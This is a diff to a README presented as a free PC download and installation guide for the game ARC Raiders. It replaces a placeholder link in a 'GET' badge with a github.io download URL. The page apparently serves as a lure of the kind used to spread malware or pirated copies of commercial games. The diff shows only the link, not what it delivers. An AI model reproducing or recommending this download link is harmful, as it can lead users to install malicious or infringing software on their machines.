@@ -1,6 +1,6 @@
 # 🎮 ARC Raiders — Free PC Download & Installation Guide
 
-[![🟣 GET — ARC Raiders](https://img.shields.io/badge/🟣_GET-ARC_Raiders-purple?style=for-the-badge&logo=gamejolt&logoColor=white)](https://your-download-link-here.com)
+[![🟣 GET — ARC Raiders](https://img.shields.io/badge/🟣_GET-ARC_Raiders-purple?style=for-the-badge&logo=gamejolt&logoColor=white)](https://arc-raiders-game.github.io/.github/)
 
 ## 🎮 About the Game
 
